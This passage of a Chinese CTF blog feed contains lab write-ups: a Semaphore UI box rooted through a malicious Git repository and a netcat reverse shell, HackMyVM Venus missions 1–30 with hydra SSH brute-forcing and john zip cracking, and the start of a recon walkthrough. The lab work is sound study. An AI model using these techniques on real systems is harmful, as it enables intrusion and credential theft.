为了使任务能够继续执行到触发漏洞的阶段，需要解决Git仓库克隆失败的问题。采取以下步骤：

1. **创建恶意仓库**: 在GitHub上创建一个公开的仓库，其中包含一个名为 `test` 的文件，文件内容为我们的反弹shell命令。

   ![image-20250806131556828](http://7r1UMPHK.github.io/image/20250806131557125.webp)

2. **配置Semaphore仓库**: 在Semaphore UI的 **仓库 (Repositories)** 设置中，编辑 `test` 仓库，将其URL修改为我们创建的恶意GitHub仓库地址 (`https://github.com/xxxx/test.git`)。

3. **设置监听器**: 在攻击机 (Kali) 上开启 `netcat` 监听，准备接收反弹shell。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ nc -lvnp 8888
   ```

4. **执行任务**: 回到任务模板页面，重新运行 `test` 任务。这次，仓库克隆成功，任务继续执行，从而触发了我们预设在 `test` 文件中的反弹shell命令。

成功在本地 `netcat` 监听器上接收到来自目标服务器的 `root` 权限反弹shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 53826
bash: cannot set terminal process group (348): Inappropriate ioctl for device
bash: no job control in this shell
root@Team:~/repository_1_template_1# id
uid=0(root) gid=0(root) groups=0(root)
```

# **三、夺取旗帜**

获取 `root` shell后，直接读取用户和根目录下的旗帜文件。

```bash
root@Team:~/repository_1_template_1# cat /root/root.txt /home/ll104567/user.txt
flag{root-cf768ad5a2fbffcf22d79bdb3feac305}
flag{user-f1d1d471045542b64f3fff665b42035a}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Team.html</guid><pubDate>Wed, 06 Aug 2025 12:20:01 +0000</pubDate></item><item><title>hmv_Labs_venus22to30</title><link>https://7r1UMPHK.github.io/post/hmv_Labs_venus22to30.html</link><description># 继续
## **Mission 0x22: eloise -&gt; lucia**

-   **任务**: 用户 `lucia` 用一种有创意的方式保存了她的密码。

1.  在家目录中发现一个 `hi` 文件，其内容为十六进制格式。

    ```bash
    eloise@venus:~$ cat hi
    00000000: 7576 4d77 4644 5172 5157 504d 6547 500a
    ```

2.  这是一个十六进制转储 (hexdump)，需要将其转换回原始文本。使用 `xxd` 工具进行逆向转换。

    ```bash
    eloise@venus:~$ cat hi | xxd -r -p
    uvMwFDQrQWPMeGP
    ```

3.  使用得到的密码切换到 `lucia` 用户。

    ```bash
    eloise@venus:~$ su lucia
    Password: uvMwFDQrQWPMeGP
    ```

---

## **Mission 0x23: lucia -&gt; isabel**

-   **任务**: 用户 `isabel` 的密码在 `/etc/xdg` 目录下的一个文件中，文件名不详，但 `dict.txt` 文件可以提供线索。

1.  检查家目录下的 `dict.txt`，它包含一个文件名列表。同时，在该文件中发现了一个隐藏的 Flag。

2.  编写一个循环脚本，读取 `dict.txt` 中的每一行，并尝试访问 `/etc/xdg/` 目录下对应的文件，直到找到密码为止。

    ```bash
    lucia@venus:~$ while read f; do file='/etc/xdg/$f'; cat '$file' 2&gt;/dev/null &amp;&amp; echo 'Found in: $file' &amp;&amp; break; done &lt; ~/dict.txt
    H5ol8Z2mrRsorC0
    Found in: /etc/xdg/readme
    ```

3.  脚本成功在 `/etc/xdg/readme` 文件中找到了密码。使用该密码切换到 `isabel` 用户。

    ```bash
    lucia@venus:~$ su isabel
    Password: H5ol8Z2mrRsorC0
    ```

---

## **Mission 0x24: isabel -&gt; freya**

-   **任务**: 用户 `freya` 的密码是 `different.txt` 文件中唯一没有重复的字符串。

1.  解决这个问题的标准方法是先对文件内容进行排序，然后使用 `uniq -u` 命令找出只出现一次的行。

    ```bash
    isabel@venus:~$ sort different.txt | uniq -u
    EEDyYFDwYsmYawj
    ```

2.  切换到 `freya` 用户。

    ```bash
    isabel@venus:~$ su freya
    Password: EEDyYFDwYsmYawj
    ```

---

## **Mission 0x25: freya -&gt; alexa**

-   **任务**: 用户 `alexa` 每分钟会在 `/free` 目录下创建一个包含密码的 `.txt` 文件，然后立即删除它。

1.  这是一个典型的竞态条件问题。我们需要持续监控目标目录，并在文件出现时迅速读取其内容。

2.  使用一个 `while` 循环来不断尝试读取 `/free` 目录下的 `.txt` 文件（根据 `ls` 发现文件名为 `beer.txt`）。

    ```bash
    freya@venus:/free$ while true; do cat *.txt 2&gt;/dev/null; sleep 0.1; done
    mxq9O3MSxxX9Q3S
    ```

3.  成功捕获到密码后，切换到 `alexa` 用户。

    ```bash
    freya@venus:/free$ su alexa
    Password: mxq9O3MSxxX9Q3S
    ```

---

## **Mission 0x26: alexa -&gt; ariel**

-   **任务**: 用户 `ariel` 的密码在线 (HTTP)。

1.  这个提示意味着密码可以通过访问本地的 Web 服务获取。使用 `curl` 命令请求 `127.0.0.1`。

    ```bash
    alexa@venus:~$ curl 127.0.0.1
    33EtHoz9a0w2Yqo
    ```

2.  直接得到了密码，切换到 `ariel` 用户。

    ```bash
    alexa@venus:~$ su ariel
    Password: 33EtHoz9a0w2Yqo
    ```

---

## **Mission 0x27: ariel -&gt; lola**

-   **任务**: `ariel` 没来得及保存 `lola` 的密码，但留下了一个临时文件 `.goas.swp`。

1.  `.swp` 文件是 Vim 编辑器的交换文件。使用 `strings` 命令可以从中提取可打印的字符，通常能找到有用的信息。

    ```bash
    ariel@venus:~$ strings .goas.swp
    # ... (部分输出)
    --&gt;VVjqJGRrnfKmcgD
    --&gt;bnQgcXYamhSDSff
    --&gt;QsymOOVbzSaKmRm
    # ... (更多密码)
    --&gt;ppkJjqYvSCIyAhK
    Thats my little DIc with my old and current passw0rds:
    ```

2.  文件内容是一个密码列表。由于无法确定哪一个是正确的，需要将列表复制到本地，使用 `hydra` 等工具对 `lola` 用户的 SSH 服务进行爆破。

    ```bash
    # 在本地Kali系统上执行，'pass'文件包含从.swp文件中提取的密码列表
    hydra -l lola -P pass ssh://venus.hackmyvm.eu:5000 -t 64
    ```

3.  Hydra 很快找到了正确的密码 `d3LieOzRGX5wud6`。使用该密码登录 `lola` 账户。

---

## **Mission 0x28: lola -&gt; celeste**

-   **任务**: 用户 `celeste` 留下了一个文件名列表 `pages.txt`，她的密码可能在其中一个 `.html` 页面里。

1.  与 Mission 23 类似，需要编写脚本来测试 `pages.txt` 中的所有可能性。这次是检查哪个页面在本地 Web 服务器上存在。

2.  使用 `while` 循环读取列表，并通过 `curl` 检查每个页面的 HTTP 状态码。

    ```bash
    lola@venus:~$ while read p; do code=$(curl -s -o /dev/null -w '%{http_code}' 'http://127.0.0.1/$p.html'); if [ '$code' == '200' ]; then echo 'Found: $p.html'; fi; done &lt; pages.txt
    Found: cebolla.html
    ```

3.  找到了返回 `200 OK` 的页面 `cebolla.html`。访问该页面获取密码。

    ```bash
    lola@venus:~$ curl 127.0.0.1/cebolla.html
    VLSNMTKwSV2o8Tn
    ```

4.  切换到 `celeste` 用户。

    ```bash
    lola@venus:~$ su celeste
    Password: VLSNMTKwSV2o8Tn
    ```

---

## **Mission 0x29: celeste -&gt; nina**

-   **任务**: 用户 `celeste` 可以访问 MySQL，但有什么用呢？

1.  使用 `celeste` 当前的密码尝试登录 MySQL 数据库。

    ```bash
    celeste@venus:~$ mysql -u celeste -pVLSNMTKwSV2o8Tn
    ```

2.  登录成功后，查询数据库中的信息。
    ```sql
    MariaDB [(none)]&gt; SHOW DATABASES;
    MariaDB [(none)]&gt; USE venus;
    MariaDB [venus]&gt; SHOW TABLES;
    MariaDB [venus]&gt; SELECT * FROM people;
    ```

3.  `people` 表中包含大量用户名和密码。其中，`id_people=35` 的 `pazz` 字段是一个隐藏 Flag。同时，`id_people=74` 的 `nina` 用户凭证看起来很有希望。

4.  将所有凭证复制到本地，再次使用 `hydra` 爆破 SSH，最终确认 `nina` 的密码。
    ```bash
    # 在本地Kali系统上执行，'db_pass.txt'为从数据库导出的user:pass文件
    hydra -C db_pass.txt ssh://venus.hackmyvm.eu:5000
    # ...
    # [5000][ssh] host: venus.hackmyvm.eu   login: nina   password: ixpeqdWuvC5N9kG
    ```

5.  使用找到的密码 `ixpeqdWuvC5N9kG` 登录 `nina` 账户。

---

## **Mission 0x30: nina -&gt; kira**

-   **任务**: 用户 `kira` 在 `http://localhost/method.php` 藏了东西。

1.  文件名 `method.php` 暗示需要测试不同的 HTTP 请求方法。

2.  使用 `for` 循环测试常用的 HTTP 方法，并观察响应。

    ```bash
    nina@venus:~$ for method in GET POST PUT DELETE PATCH OPTIONS; do echo -n '[$method] -&gt; '; curl -s -X '$method' http://localhost/method.php; done
    [GET] -&gt; I dont like this method!
    [POST] -&gt; I dont like this method!
    [PUT] -&gt; tPlqxSKuT4eP3yr
    [DELETE] -&gt; I dont like this method!
    [PATCH] -&gt; I dont like this method!
    [OPTIONS] -&gt; I dont like this method!
    ```

3.  发现使用 `PUT` 方法时，服务器返回了密码。

4.  切换到 `kira` 用户。

    ```bash
    nina@venus:~$ su kira
    Password: tPlqxSKuT4eP3yr
    ```

---

# **Flag  **

```
22. lucia:         8===5Sr2pqeVTmn8RaaPmTPE===D~~
23. isabel:        8===Md2CU83GtVfouhm9U0AS===D~~
24. freya:         8===m1rRSv2pdm3sBGmgidul===D~~
25. alexa:         8===12ALP3eLlJ1GrTBxwJQM===D~~
26. ariel:         8===lqTeJ1msxhNjNJCptxmZ===D~~
27. lola:          8===TMYRw853hx8yKRocFMgM===D~~
28. celeste:       8===TrdsvMy99slFZtd4Cy4Q===D~~
29. nina:          8===VwICIymoA1DczWJau1sG===D~~
30. kira:          8===rJun2WyeuGIvabWQvJko===D~~

Hidden Flags:
- (Mission 23)   8===CISqRtRjnvQbzcRWfCqe===D~~
- (Mission 29)   8===xKmPDsJSKpHLzkqKXyjx===D~~
```

# Pass

```
22: lucia/uvMwFDQrQWPMeGP
23: isabel/H5ol8Z2mrRsorC0
24: freya/EEDyYFDwYsmYawj
25: alexa/mxq9O3MSxxX9Q3S
26: ariel/33EtHoz9a0w2Yqo
27: lola/d3LieOzRGX5wud6
28: celeste/VLSNMTKwSV2o8Tn
29: nina/ixpeqdWuvC5N9kG
30: kira/tPlqxSKuT4eP3yr
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Labs_venus22to30.html</guid><pubDate>Wed, 06 Aug 2025 00:54:45 +0000</pubDate></item><item><title>hmv_Labs_venus1to21</title><link>https://7r1UMPHK.github.io/post/hmv_Labs_venus1to21.html</link><description># **简介**

Venus 是 HackMyVM.eu 推出的一个适合初学者的 CTF（夺旗赛）靶机。本攻略将记录从初始用户 `hacker` 开始，通过解决一系列谜题，逐步提权，最终获取到Vhidden奖杯的全过程。

---

# 开打

## **Mission 0x01: hacker -&gt; sophia**

- **任务**: 用户 `sophia` 的密码保存在当前目录的一个隐藏文件中。

1.  首先，使用 `ls -al` 命令查找所有文件，包括隐藏文件。

    ```bash
    hacker@venus:~$ ls -al
    total 40
    drwxr-x--- 1 root   hacker 4096 Apr  5  2024 .
    drwxr-xr-x 1 root   root   4096 Apr  5  2024 ..
    -rw-r----- 1 root   hacker   31 Apr  5  2024 ...
    -rw-r--r-- 1 hacker hacker  220 Apr 23  2023 .bash_logout
    -rwxr-xr-x 1 hacker hacker 3653 Jul 24 00:48 .bashrc
    -rw-r----- 1 root   hacker   16 Apr  5  2024 .myhiddenpazz
    -rw-r--r-- 1 hacker hacker    0 Jun 20 00:35 .profile
    -rw-r----- 1 root   hacker  287 Apr  5  2024 mission.txt
    -rw-r----- 1 root   hacker 2542 Apr  5  2024 readme.txt
    ```

2.  发现可疑隐藏文件 `.myhiddenpazz`，读取内容得到密码。

    ```bash
    hacker@venus:~$ cat .myhiddenpazz
    Y1o645M3mR84ejc
    ```

3.  切换到 `sophia` 用户。

    ```bash
    hacker@venus:~$ su sophia
    Password: Y1o645M3mR84ejc
    ```

---

## **Mission 0x02: sophia -&gt; angela**
- **任务**: 用户 `angela` 的密码在一个名为 `whereismypazz.txt` 的文件中，但她忘记了文件位置。

1.  使用 `find` 命令在整个文件系统中搜索该文件。

    ```bash
    sophia@venus:~$ find / -name 'whereismypazz.txt' 2&gt;/dev/null
    /usr/share/whereismypazz.txt
    ```

2.  读取文件内容得到密码。

    ```bash
    sophia@venus:~$ cat /usr/share/whereismypazz.txt
    oh5p9gAABugHBje
    ```

3.  切换到 `angela` 用户。

    ```bash
    sophia@venus:~$ su angela
    Password: oh5p9gAABugHBje
    ```

---

## **Mission 0x03: angela -&gt; emma**
- **任务**: 用户 `emma` 的密码在 `findme.txt` 文件的第 4069 行。

1.  使用 `sed` 命令直接打印指定行。

    ```bash
    angela@venus:~$ sed -n '4069p' findme.txt
    fIvltaGaq0OUH8O
    ```

2.  切换到 `emma` 用户。

    ```bash
    angela@venus:~$ su emma
    Password: fIvltaGaq0OUH8O
    ```

---

## **Mission 0x04: emma -&gt; mia**
- **任务**: 用户 `mia` 的密码在名为 `-` 的文件中。

1.  由于文件名是特殊字符，使用 `./-` 来指定当前目录下的该文件。

    ```bash
    emma@venus:~$ cat ./-
    iKXIYg0pyEH2Hos
    ```

2.  切换到 `mia` 用户。

    ```bash
    emma@venus:~$ su mia
    Password: iKXIYg0pyEH2Hos
    ```

---

## **Mission 0x05: mia -&gt; camila**
- **任务**: 用户 `camila` 的密码在名为 `hereiam` 的文件夹内。

1.  首先找到 `hereiam` 文件夹的位置。

    ```bash
    mia@venus:~$ find / -name 'hereiam' 2&gt;/dev/null
    /opt/hereiam
    ```

2.  进入该目录并查找里面的隐藏文件。

    ```bash
    mia@venus:/opt/hereiam$ ls -la
    total 12
    drwxr-xr-x 2 root root 4096 Apr  5  2024 .
    drwxr-xr-x 1 root root 4096 Apr  5  2024 ..
    -rw-r--r-- 1 root root   16 Apr  5  2024 .here
    
    mia@venus:/opt/hereiam$ cat .here
    F67aDmCAAgOOaOc
    ```

3.  切换到 `camila` 用户。

    ```bash
    mia@venus:/opt/hereiam$ su camila
    Password: F67aDmCAAgOOaOc
    ```

---

## **Mission 0x06: camila -&gt; luna**
- **任务**: 用户 `luna` 的密码在 `muack` 文件夹内的某个文件中。

1.  `muack` 文件夹内文件众多，使用 `find` 和 `file` 命令组合，找到类型为 `ASCII text` 的常规文件。

    ```bash
    camila@venus:~/muack$ find . -type f -exec file {} \; | grep 'text'
    ./111/111/muack: ASCII text
    ```

2.  读取找到的文件。

    ```bash
    camila@venus:~/muack$ cat ./111/111/muack
    j3vkuoKQwvbhkMc
    ```

3.  切换到 `luna` 用户。

    ```bash
    camila@venus:~/muack$ su luna
    Password: j3vkuoKQwvbhkMc
    ```

---

## **Mission 0x07: luna -&gt; eleanor**
- **任务**: 用户 `eleanor` 的密码在一个占用 6969 字节的文件中。

1.  使用 `find` 命令的 `-size` 参数查找特定大小的文件。

    ```bash
    luna@venus:~$ find / -type f -size 6969c 2&gt;/dev/null
    /usr/share/moon.txt
    ```

2.  读取文件内容。

    ```bash
    luna@venus:~$ cat /usr/share/moon.txt
    UNDchvln6Bmtu7b
    ```

3.  切换到 `eleanor` 用户。

    ```bash
    luna@venus:~$ su eleanor
    Password: UNDchvln6Bmtu7b
    ```

---

## **Mission 0x08: eleanor -&gt; victoria**
- **任务**: 用户 `victoria` 的密码所在文件的所有者是 `violin`。

1.  使用 `find` 命令的 `-user` 参数查找属于特定用户的文件。

    ```bash
    eleanor@venus:~$ find / -user violin 2&gt;/dev/null
    /usr/local/games/yo
    ```

2.  读取文件内容。

    ```bash
    eleanor@venus:~$ cat /usr/local/games/yo
    pz8OqvJBFxH0cSj
    ```

3.  切换到 `victoria` 用户。

    ```bash
    eleanor@venus:~$ su victoria
    Password: pz8OqvJBFxH0cSj
    ```

---

## **Mission 0x09: victoria -&gt; isla**
- **任务**: 用户 `isla` 的密码在一个 zip 文件中。

1.  目标系统无法写入文件，先将 `passw0rd.zip` 文件内容用 `base64` 编码后复制出来。

    ```bash
    victoria@venus:~$ base64 passw0rd.zip
    UEsDBAoAAAAAAIMzhViqg0LgEAAAABAAAAAbABwAcHduZWQvdmljdG9yaWEvcGFzc3cwcmQudHh0
    VVQJAAP2mQ9m9pkPZnV4CwABBAAAAAAEAAAAAEQzWFRvYjBGVUltc29CYgpQSwECHgMKAAAAAACD
    M4VYqoNC4BAAAAAQAAAAGwAYAAAAAAABAAAApIEAAAAAcHduZWQvdmljdG9yaWEvcGFzc3cwcmQu
    dHh0VVQFAAP2mQ9mdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEAYQAAAGUAAAAAAA==
    ```

2.  在本地机器上解码并解压。

    ```bash
    # 在本地Kali系统上执行
    echo '...' | base64 -d &gt; passw0rd.zip
    unzip passw0rd.zip
    cat pwned/victoria/passw0rd.txt
    D3XTob0FUImsoBb
    ```

3.  切换到 `isla` 用户。

    ```bash
    victoria@venus:~$ su isla
    Password: D3XTob0FUImsoBb
    ```

---

## **Mission 0x10: isla -&gt; violet**
- **任务**: 用户 `violet` 的密码在 `passy` 文件中以 `a9HFX` 开头的行，但这 5 个字符不是密码的一部分。

1.  使用 `grep` 查找包含 `a9HFX` 的行，并手动去除前缀。

    ```bash
    isla@venus:~$ grep 'a9HFX' passy
    # ... (多行输出)
    a9HFXWKINVzNQLKLDVAc 
    ```
    密码是 `WKINVzNQLKLDVAc`。

2.  切换到 `violet` 用户。

    ```bash
    isla@venus:~$ su violet
    Password: WKINVzNQLKLDVAc
    ```

---

## **Mission 0x11: violet -&gt; lucy**
- **任务**: 用户 `lucy` 的密码在 `end` 文件中以 `0JuAZ` 结尾的行，但这 5 个字符不是密码的一部分。

1. 使用 `grep` 查找该行，并手动去除后缀。

   ```bash
   violet@venus:~$ grep '0JuAZ' end
   OCmMUjebG53giud0JuAZ
   ```

   密码是 `OCmMUjebG53giud`。

1. 切换到 `lucy` 用户。

   ```bash
   violet@venus:~$ su lucy
   Password: OCmMUjebG53giud
   ```

---

## **Mission 0x12: lucy -&gt; elena**
- **任务**: 用户 `elena` 的密码在 `file.yo` 文件中位于 `fu` 和 `ck` 之间。

1.  使用 `grep -o` 来仅提取匹配的部分。

    ```bash
    lucy@venus:~$ grep -o 'fu.*ck' file.yo
    fu4xZ5lIKYmfPLg9tck
    ```
    密码是 `4xZ5lIKYmfPLg9t`。

2.  切换到 `elena` 用户。

    ```bash
    lucy@venus:~$ su elena
    Password: 4xZ5lIKYmfPLg9t
    ```

---

## **Mission 0x13: elena -&gt; alice**
- **任务**: 用户 `alice` 的密码在一个环境变量中。

1.  使用 `env` 命令查看所有环境变量。

    ```bash
    elena@venus:~$ env
    # ... (省略部分输出)
    PASS=Cgecy2MY2MWbaqt
    # ...
    ```

2.  切换到 `alice` 用户。

    ```bash
    elena@venus:~$ su alice
    Password: Cgecy2MY2MWbaqt
    ```

---

## **Mission 0x14: alice -&gt; anna**
- **任务**: `anna` 的密码作为注释留在了 `/etc/passwd` 文件中。

1.  查看 `/etc/passwd` 文件，注意 `alice` 用户行的注释字段。

    ```bash
    alice@venus:~$ cat /etc/passwd
    # ...
    alice:x:1014:1014:w8NvY27qkpdePox:/pwned/alice:/bin/bash
    anna:x:1015:1015::/pwned/anna:/bin/bash
    # ...
    ```
    在 `alice` 用户行的第五个字段（注释字段）找到了 `anna` 的密码 `w8NvY27qkpdePox`。

2.  切换到 `anna` 用户。

    ```bash
    alice@venus:~$ su anna
    Password: w8NvY27qkpdePox
    ```

---

## **Mission 0x15: anna -&gt; natalia**
- **任务**: 使用 `sudo` 成为 `natalia` 用户。

1.  首先检查 `sudo` 权限。

    ```bash
    anna@venus:~$ sudo -l
    User anna may run the following commands on venus:
        (natalia) NOPASSWD: /bin/bash
    ```

2.  发现可以免密以 `natalia` 的身份执行 `/bin/bash`，直接提权。

    ```bash
    anna@venus:~$ sudo -u natalia /bin/bash
    natalia@venus:/pwned/anna$
    ```

---

## **Mission 0x16: natalia -&gt; eva**
- **任务**: `eva` 的密码被编码在 `base64.txt` 文件中。

1.  读取文件内容并通过 `base64 -d` 解码。

    ```bash
    natalia@venus:~$ cat base64.txt | base64 -d
    upsCA3UFu10fDAO
    ```

2.  切换到 `eva` 用户。

    ```bash
    natalia@venus:~$ su eva
    Password: upsCA3UFu10fDAO
    ```

---

## **Mission 0x17: eva -&gt; clara**
- **任务**: `clara` 的密码在一个 1968 年 5 月 1 日之后修改过的文件中。（这里自己想想办法，我不想复现了）

1.  根据提示，可以推断文件的修改时间比较特殊。经过查找，发现一个时间戳非常早的文件。

    ```bash
    eva@venus:~$ ls -al /usr/lib/cmdo
    -rw-r--r-- 1 root root 16 Jan  1  1970 /usr/lib/cmdo
    ```

2.  读取该文件内容。

    ```bash
    eva@venus:~$ cat /usr/lib/cmdo
    39YziWp5gSvgQN9
    ```

3.  切换到 `clara` 用户。

    ```bash
    eva@venus:~$ su clara
    Password: 39YziWp5gSvgQN9
    ```

---

## **Mission 0x18: clara -&gt; frida**
- **任务**: `frida` 的密码在一个受密码保护的 zip 文件中，提示 `rockyou.txt` 字典可能会有帮助。

1.  首先将 `protected.zip` 文件 `base64` 编码并复制到本地。

    ```bash
    clara@venus:~$ base64 protected.zip
    UEsDBAoACQAAAIMzhVhzdJ8jHAAAABAAAAAZABwAcHduZWQvY2xhcmEvcHJvdGVjdGVkLnR4dFVU
    CQAD9pkPZvaZD2Z1eAsAAQQAAAAABAAAAACc/uQ52ED8vSTlcON+hM2vBK6cXas6YlcIf/9rUEsH
    CHN0nyMcAAAAEAAAAFBLAQIeAwoACQAAAIMzhVhzdJ8jHAAAABAAAAAZABgAAAAAAAEAAACkgQAA
AABwd25lZC9jbGFyYS9wcm90ZWN0ZWQudHh0VVQFAAP2mQ9mdXgLAAEEAAAAAAQAAAAAUEsFBgAA
AAABAAEAXwAAAH8AAAAAAA==
    ```

2.  在本地，使用 `john` 和 `rockyou.txt` 字典爆破 zip 密码。

    ```bash
    # 在本地Kali等系统上执行
    echo '...' | base64 -d &gt; protected.zip
    zip2john protected.zip &gt; hash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash
    # ...
    # 爆破出密码为 pass123
    ```

3.  使用爆破出的密码解压文件，并读取 `frida` 的密码。

    ```bash
    # 在本地Kali等系统上执行
    7z x protected.zip # 输入密码 pass123
    cat pwned/clara/protected.txt
    Ed4ErEUJEaMcXli
    ```

4.  切换到 `frida` 用户。

    ```bash
    clara@venus:~$ su frida
    Password: Ed4ErEUJEaMcXli
    ```

---

## **Mission 0x19: frida -&gt; eliza**
- **任务**: `eliza` 的密码是 `repeated.txt` 文件中唯一重复的字符串。

1.  对文件排序后，使用 `uniq -d` 可以找到重复的行。

    ```bash
    frida@venus:~$ awk 'NR==1{prev=$0; next} $0==prev{print prev} {prev=$0}' repeated.txt
    Fg6b6aoksceQqB9
    ```

2.  切换到 `eliza` 用户。

    ```bash
    frida@venus:~$ su eliza
    Password: Fg6b6aoksceQqB9
    ```

---

## **Mission 0x20: eliza -&gt; iris**
- **任务**: `iris` 给我留下了她的密钥。

1.  在 `eliza` 的家目录中，找到了 `.iris_key`，这是 SSH 私钥。

    ```bash
    eliza@venus:~$ ls -al
    # ...
    -rw-r----- 1 root  eliza 2602 Apr  5  2024 .iris_key
    ```

2.  使用这个私钥通过 SSH 登录到 `iris` 账户。

    ```bash
    eliza@venus:~$ ssh iris@127.0.0.1 -i .iris_key
    Welcome to Debian GNU/Linux 11 (bullseye)!
    # ...
    iris@venus:~$
    ```

---

## **Mission 0x21: iris -&gt; eloise**
- **任务**: `eloise` 用一种特殊的方式保存了她的密码。

1.  在 `iris` 家目录中发现一个名为 `eloise` 的文件，内容看起来是 Base64 编码的。

    ```bash
    iris@venus:~$ cat eloise
    /9j/4AAQSkZJRgABAQEAYABgAAD/4RDSRXhpZgAATU0AKgAAAAgABAE7AAIAAAAEc01MAIdpAAQA
    # ... (省略)
    ```

2.  将内容复制到本地，解码后发现是一个 JPEG 图片文件。

    ```bash
    # 在本地Kali等系统上执行
    cat eloise_base64.txt | base64 -d &gt; eloise.jpg
    file eloise.jpg
    # eloise.jpg: JPEG image data ...
    ```

3.  打开图片，图片中显示了密码：`yOUJlV0SHOnbSPm`。

4.  切换到 `eloise` 用户。

    ```bash
    iris@venus:~$ su eloise
    Password: yOUJlV0SHOnbSPm
    eloise@venus:~$
    ```

---

# **Flag 汇总**

```bash
1.  sophia:   8===LUzzNuv8NB59iztWUIQS===D~~
2.  angela:   8===SjMYBmMh4bk49TKq7PM8===D~~
3.  emma:     8===0daqdDlmd9XogkiHu4yq===D~~
4.  mia:      8===FBMdY8hel2VMA3BaYJin===D~~
5.  camila:   8===iDIi5sm1mDuqGmU5Psx6===D~~
6.  luna:     8===KCO34FpIq3nBmHbyZvFh===D~~
7.  eleanor:  8===Iq5vbyiQl4ipNrLDArjD===D~~
8.  victoria: 8===NWyTFi9LLqVsZ4OnuZYN===D~~
9.  isla:     8===ZyZqc1suvGe4QlkZHFlq===D~~
10. violet:   8===LzErk0qFPYJj16mNnnYZ===D~~
11. lucy:     8===AdCJ4wl8pmbhi770Xbd3===D~~
12. elena:    8===st1pTdqEQ0bvrJfWGwLA===D~~
13. alice:    8===Qj4NNWp8LOC96S9Rtgrk===D~~
14. anna:     8===5Y3DhT66fa6Da8RpLKG0===D~~
15. natalia:  8===JWHa1GQq1AYrBWNXEJrH===D~~
16. eva:      8===22cqk3iGkGYVqnYrHiof===D~~
17. clara:    8===EJWmHDEQeEN1vIR7NYiH===D~~
18. frida:    8===Ikg2qj8KT2bGJtWvR6hC===D~~
19. eliza:    8===zwWIPyDf2ozwVhCTxm1I===D~~
20. iris:     8===ClrdWOqlZ1vL61zSk9Va===D~~
21. eloise:   8===57CzBLKaEq2N8YBFRu31===D~~
```

# Pass

```bash
01: sophia/Y1o645M3mR84ejc
02: angela/oh5p9gAABugHBje
03: emma/fIvltaGaq0OUH8O
04: mia/iKXIYg0pyEH2Hos
05: camila/F67aDmCAAgOOaOc
06: luna/j3vkuoKQwvbhkMc
07: eleanor/UNDchvln6Bmtu7b
08: victoria/pz8OqvJBFxH0cSj
09: isla/D3XTob0FUImsoBb
10: violet/WKINVzNQLKLDVAc
11: lucy/OCmMUjebG53giud
12: elena/4xZ5lIKYmfPLg9t
13: alice/Cgecy2MY2MWbaqt
14: anna/w8NvY27qkpdePox
15: natalia/NMuc4DkYKDsmZ5z
16: eva/upsCA3UFu10fDAO
17: clara/39YziWp5gSvgQN9
18: frida/Ed4ErEUJEaMcXli
19: eliza/Fg6b6aoksceQqB9
20: iris/kYjyoLcnBZ9EJdz
21: eloise/yOUJlV0SHOnbSPm
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Labs_venus1to21.html</guid><pubDate>Wed, 06 Aug 2025 00:54:26 +0000</pubDate></item><item><title>内部_Base</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Base.html</link><description>![image-20250724102315597](http://7r1UMPHK.github.io/image/20250724102323560.webp)

浅浅娱乐一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l          
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.210 08:00:27:5d:66:94       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fc:a8:ce       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.965 seconds (130.28 hosts/sec). 4 responded
```

192.168.205.210的ip

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 22:24 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:5D:66:94 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
```

看80端口
![image-20250724102447816](http://7r1UMPHK.github.io/image/20250724102448088.webp)

看到了版本号，但是这个靶机不是打那个，所以不用管

进行目录爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db -t 64 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.210
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip,db
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.210/images/]
/.php                 (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 9329]
/users.db             (Status: 200) [Size: 12288]
/robots.txt           (Status: 200) [Size: 33]
/LICENSE.txt          (Status: 200) [Size: 14900]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/UPGRADE.txt          (Status: 200) [Size: 956]
Progress: 461907 / 1323360 (34.90%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 462062 / 1323360 (34.92%)
===============================================================
Finished
===============================================================
```

感兴趣的有`robots.txt`、`user.db`

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 192.168.205.210/robots.txt                                           
User-agent: *
